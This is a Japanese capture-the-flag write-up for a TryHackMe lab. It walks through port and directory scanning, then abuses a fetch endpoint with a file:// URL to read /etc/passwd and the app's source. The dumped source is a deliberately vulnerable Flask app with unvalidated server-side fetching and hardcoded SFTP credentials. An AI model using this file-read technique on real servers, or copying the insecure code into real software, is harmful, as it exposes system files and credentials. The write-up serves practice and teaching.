# Message to Garcia CTF

https://tryhackme.com/room/messagetogarcia

## Enumeration

```shell
TARGET=10.49.175.1
sudo bash -c "echo $TARGET   garcia.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80,5000 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.24.0 (Ubuntu)
5000/tcp open  upnp?
```

SSH, HTTP

5000に適当にテキストを送ると、HTMLが返ってきた。

```sh
$ nc $TARGET 5000            
aaa
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 400</p>
        <p>Message: Bad request syntax ('aaa').</p>
        <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
    </body>
</html>
```

80ポートの表示

```txt
Message to Garcia
Securely deliver an encrypted message using PGP encryption and interact with the API to validate and submit the message.

Upload the encrypted message file here (message.enc or .gpg).
```

Firefox で表示したら下記のポップアップが表示された。

```txt
Introduction

The goal is to securely deliver a Message to Garcia by:

    Discovering and exploiting web application vulnerabilities.
    Gaining unauthorized access to sensitive server resources.
    Using obtained information to complete the cryptographic challenge.
```

Show instructions

```txt
Instructions

A step-by-step guide to this challenge.

Step 1
Explore the application and discover additional functionality.

Step 2
Exploit the server to obtain the cryptographic key material.

Step 3
Prepare and encrypt the required message for Garcia.

Step 4
Successfully deliver the encrypted message to complete the mission.
```

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://garcia.thm/ ----
+ http://garcia.thm/backup (CODE:200|SIZE:2562)                                                                           
+ http://garcia.thm/fetch (CODE:200|SIZE:2264)                                                                            
+ http://garcia.thm/start (CODE:302|SIZE:189)                                                                             
+ http://garcia.thm/status (CODE:200|SIZE:992)                                                                            
+ http://garcia.thm/stop (CODE:302|SIZE:189)                                                                              
+ http://garcia.thm/success (CODE:302|SIZE:189)                                                                           
+ http://garcia.thm/upload (CODE:405|SIZE:153)
```

### /status

SFTPサーバーを開始、停止できる。初期状態は停止。

### /backup

指定のパスにファイルアップロードできるとのこと。

```txt
Backup System
Upload files to the backup system with custom filenames

File Backup
Upload any file with a custom filename/path
```

/tmp/test.enc を指定したら ` File uploaded successfully to: /home/ubuntu/sftp-msg2g4arc1a/uploads/tmp_test.enc ` にアップロードされた。

### /fetch

外部・内部リソースをフェッチできる。

```txt
Resource Fetcher
Fetch external resources or internal files

Fetch Resource
Enter a URL to fetch content from external or local resources
```

file:///etc/passwd でファイルを読めた。

```sh
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
polkitd:x:997:997:User for polkitd:/:/usr/sbin/nologin
```

`/proc/self/environ` を見ることで、Python（DjangoかFlaskか）であることが分かった。ディレクトリが分かったのでソースコードを狙う。

/home/ubuntu/sftp-msg2g4arc1a/app.py

```python
import os
import urllib.parse
import urllib.request
from flask import Flask, render_template, redirect, url_for, flash, request, session, jsonify
from sftp_server import sftp_server_instance
from functions import is_valid_gpg_file, ensure_upload_folder, validate_encrypted_message

app = Flask(__name__, static_folder="static")
app.config["UPLOAD_FOLDER"] = "uploads"
app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024
import secrets
app.secret_key = secrets.token_hex(32)

ensure_upload_folder(app.config["UPLOAD_FOLDER"])

HOME_ROUTE = "/"
HOME_RESPONSE_ROUTE = "/?response"

@app.context_processor
def inject_request():
    return dict(request=request)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/upload", methods=["POST"])
def upload_file():
    try:
        if "file" not in request.files:
            flash("No file part.", "error")
            return redirect(HOME_RESPONSE_ROUTE)

        file = request.files["file"]

        if file.filename == "":
            flash("No selected file.", "error")
            return redirect(HOME_RESPONSE_ROUTE)

        if not is_valid_gpg_file(file.filename):
            flash("Invalid file type! Only .gpg or .enc files are allowed.", "error")
            return redirect(HOME_RESPONSE_ROUTE)

        filepath = os.path.join(app.config["UPLOAD_FOLDER"], file.filename)
        file.save(filepath)

        with open(filepath, "rb") as f:
            encrypted_data = f.read()

        os.remove(filepath)

        success, message = validate_encrypted_message(encrypted_data)
        if success:
            # Set a session token to verify they solved the challenge
            import secrets
            session['challenge_solved'] = secrets.token_hex(16)
            return redirect(url_for("success"))
        else:
            flash(f'{message}', "error")

        return redirect(HOME_RESPONSE_ROUTE)
    except Exception as e:
        print(f"[ERROR] Exception in upload_file: {e}")
        import traceback
        traceback.print_exc()
        flash(f"Error processing file: {str(e)}", "error")
        return redirect(HOME_RESPONSE_ROUTE)

# Vulnerable file upload endpoint with directory traversal
@app.route("/backup", methods=["GET", "POST"])
def backup_file():
    if request.method == "GET":
        return render_template("backup.html")
    
    if "file" not in request.files:
        flash("No file part.", "error")
        return redirect("/backup")

    file = request.files["file"]
    raw_name = request.form.get("filename", file.filename)

    if file.filename == "":
        flash("No selected file.", "error")
        return redirect("/backup")

    # Hard restrict to simple filenames (no directories, no traversal)
    from werkzeug.utils import secure_filename

    safe_name = secure_filename(raw_name)
    if not safe_name or "/" in safe_name or "\\" in safe_name or ".." in safe_name:
        flash("Invalid filename.", "error")
        return redirect("/backup")

    upload_root = os.path.abspath(app.config["UPLOAD_FOLDER"])
    os.makedirs(upload_root, exist_ok=True)

    filepath = os.path.abspath(os.path.join(upload_root, safe_name))

    # Ensure final path stays within uploads
    if not filepath.startswith(upload_root + os.sep):
        flash("Invalid path.", "error")
        return redirect("/backup")

    file.save(filepath)
    
    flash(f"File uploaded successfully to: {filepath}", "success")
    return redirect("/backup")

# SSRF endpoint for "fetching resources"
@app.route("/fetch", methods=["GET", "POST"])
def fetch_resource():
    if request.method == "GET":
        return render_template("fetch.html")
    
    url = request.form.get("url", "")
    
    if not url:
        flash("Please provide a URL to fetch.", "error")
        return redirect("/fetch")
    
    try:
        # Vulnerable SSRF - no URL validation
        if url.startswith("file://"):
            # Handle local file access
            file_path = url[7:]  # Remove "file://" prefix
            
            # Handle relative paths properly
            if file_path.startswith('./'):
                file_path = file_path[2:]  # Remove './' prefix
            elif file_path.startswith('/'):
                # Absolute path - use as is
                pass
            else:
                # Relative path without './' - treat as relative
                pass
                
            print(f"[DEBUG] Trying to read file: {file_path}")
            print(f"[DEBUG] Current working directory: {os.getcwd()}")
            print(f"[DEBUG] Full path will be: {os.path.abspath(file_path)}")
            try:
                with open(file_path, 'r') as f:
                    content = f.read()
                print(f"[DEBUG] Successfully read {len(content)} characters")
                flash(f"File content:\n{content}", "success")
            except UnicodeDecodeError:
                print(f"[DEBUG] Unicode decode error for file: {file_path}")
                flash(f"Error: Unable to read binary file '{file_path}'. File contains non-text data.", "error")
            except FileNotFoundError:
                print(f"[DEBUG] File not found: {file_path}")
                flash(f"Error: File '{file_path}' not found.", "error")
            except PermissionError:
                print(f"[DEBUG] Permission denied: {file_path}")
                flash(f"Error: Permission denied accessing '{file_path}'.", "error")
            except Exception as e:
                print(f"[DEBUG] Error reading file: {str(e)}")
                flash(f"Error reading file: {str(e)}", "error")
        else:
            # Handle HTTP/HTTPS requests
            response = urllib.request.urlopen(url)
            content = response.read().decode('utf-8')[:1000]  # Limit content length
            flash(f"Response content (first 1000 chars):\n{content}", "success")
    except Exception as e:
        flash(f"Error fetching resource: {str(e)}", "error")
    
    return redirect("/fetch")

@app.route("/status")
def status():
    status = "Running" if sftp_server_instance.running else "Stopped"
    return render_template("status.html", status=status)

@app.route("/start")
def start_server():
    sftp_server_instance.start()
    return redirect(url_for("index"))

@app.route("/stop")
def stop_server():
    sftp_server_instance.stop()
    return redirect(url_for("index"))

@app.route("/success")
def success():
    # Check if they actually solved the challenge
    if 'challenge_solved' not in session:
        flash("Access denied. Complete the challenge first.", "error")
        return redirect(url_for("index"))
    
    # Clear the token after viewing (one-time use)
    session.pop('challenge_solved', None)
    return render_template("success.html")

if __name__ == "__main__":
    host = "0.0.0.0" if os.getenv("FLASK_ENV") == "production" else "127.0.0.1"
    # Disable debug mode for security (prevents RCE via SSRF+debug)
    debug_mode = False
    app.run(host=host, port=5000, debug=debug_mode)
```

/home/ubuntu/sftp-msg2g4arc1a/sftp_server.py

```python
import socket
import paramiko
import threading
import os
import time

HOST_KEY = paramiko.RSAKey.generate(2048)  # Generate RSA Key
USER_CREDENTIALS = {"testuser": "testpass"}  # Username & Password
AUTHORIZED_KEYS_FILE = os.path.expanduser("~/.ssh/authorized_keys")

# === Encryption Setup ===
from cryptography.fernet import Fernet

ENCRYPTION_KEY = b'[REDACTED]'
cipher = Fernet(ENCRYPTION_KEY)
EXPECTED_MESSAGE = "[REDACTED]"

class SFTPHandler(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_auth_publickey(self, username, key):
        """ Check if the public key is authorized """
        if os.path.exists(AUTHORIZED_KEYS_FILE):
            with open(AUTHORIZED_KEYS_FILE, 'r') as f:
                authorized_keys = f.read().splitlines()

            keydata = key.get_base64()
            for line in authorized_keys:
                if keydata in line:
                    print("Public key authentication successful.")
                    return paramiko.AUTH_SUCCESSFUL

        print("Public key authentication failed.")
        return paramiko.AUTH_FAILED

    def check_auth_password(self, username, password):
        if username in USER_CREDENTIALS and USER_CREDENTIALS[username] == password:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

class SFTPServer:
    def __init__(self, host="0.0.0.0", port=2222):
        self.host = host
        self.port = port
        self.server_thread = None
        self.running = False

    def validate_file(self, file_path):
        print(f"[*] Validating uploaded file: {file_path}")
        try:
            with open(file_path, 'rb') as f:
                encrypted_data = f.read()
            
            decrypted = cipher.decrypt(encrypted_data)
            message = decrypted.decode('utf-8').strip()
            
            print(f"[*] Decrypted message: {message}")
            if message == EXPECTED_MESSAGE:
                print("[+] Message accepted. Well done, agent.")
            else:
                print("[-] Message rejected. Incorrect content.")
        except Exception as e:
            print(f"[-] Decryption failed: {e}")

        # === Delete file after validation ===
        os.remove(file_path)
        print(f"[*] Deleted processed file: {file_path}")

    def start(self):
        if self.running:
            print("Server is already running.")
            return

        def run_server():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.bind((self.host, self.port))
                sock.listen(5)
                print(f"SFTP Server running on {self.host}:{self.port}")
                self.running = True

                while self.running:
                    client, addr = sock.accept()
                    transport = paramiko.Transport(client)
                    transport.add_server_key(HOST_KEY)
                    server = SFTPHandler()
                    transport.start_server(server=server)
                    channel = transport.accept()
                    if channel is not None:
                        print(f"Client {addr} connected.")

                        # Check uploaded files
                        upload_folder = "/home/ubuntu/sftp/uploads/"
                        uploaded_files = os.listdir(upload_folder)
                        for f in uploaded_files:
                            file_path = os.path.join(upload_folder, f)
                            self.validate_file(file_path)

            except Exception as e:
                print(f"Error: {e}")

        self.server_thread = threading.Thread(target=run_server, daemon=True)
        self.server_thread.start()

    def stop(self):
        self.running = False
        print("SFTP Server stopped.")

sftp_server_instance = SFTPServer()

if __name__ == "__main__":
    sftp_server_instance.start()
```

functions.py

```python
import os
from cryptography.fernet import Fernet

# The encryption key (in a real scenario, this would be derived from the private key)
# For this challenge, we'll use a fixed key
ENCRYPTION_KEY = b'[REDACTED]'
cipher = Fernet(ENCRYPTION_KEY)

EXPECTED_MESSAGE = "[REDACTED]"

def is_valid_gpg_file(filename):
    """Check if file has .gpg or .enc extension"""
    return filename.lower().endswith((".gpg", ".enc"))

def ensure_upload_folder(folder):
    os.makedirs(folder, exist_ok=True)

def validate_encrypted_message(encrypted_data: bytes):
    """Decrypts the uploaded file and checks if it matches the expected message."""
    try:
        print(f"[*] Attempting to decrypt message...")
        decrypted = cipher.decrypt(encrypted_data)
        plaintext = decrypted.decode('utf-8').strip()
        
        print(f"[+] Decrypted message: {plaintext}")
        print(f"[DEBUG] Expected: {EXPECTED_MESSAGE}")
        print(f"[DEBUG] Match: {plaintext == EXPECTED_MESSAGE}")
        
        if plaintext == EXPECTED_MESSAGE:
            return True, "Message is valid."
        else:
            return False, "Message content does not match."
    except Exception as e:
        print(f"[-] Decryption failed: {e}")
        return False, f"Decryption failed: Invalid encryption or corrupted file."
```

ソースコード中のメッセージをソースコード中の秘密鍵で暗号化したファイル（gpg or enc）をアップロードしたらSuccessでフラグが表示される実装になっている。

## メッセージの暗号化

```python
from cryptography.fernet import Fernet

with open('secret.key', 'rb') as filekey:
    key = filekey.read()

fernet = Fernet(key)

with open('message.txt', 'rb') as file:
    original = file.read()

encrypted = fernet.encrypt(original)

with open('2garcia.enc', 'wb') as encrypted_file:
    encrypted_file.write(encrypted)
```

## 振り返り

- 一番苦労したのが、`What type of encryption is the service using?` の設問。意図がなかなか分からなかった。
- ローカルファイルの読み方が分かって、ソースコードを読めることに気づいたら後は地道に解析するだけ。

## Tags

#tags:Crypto #tags:SSRF
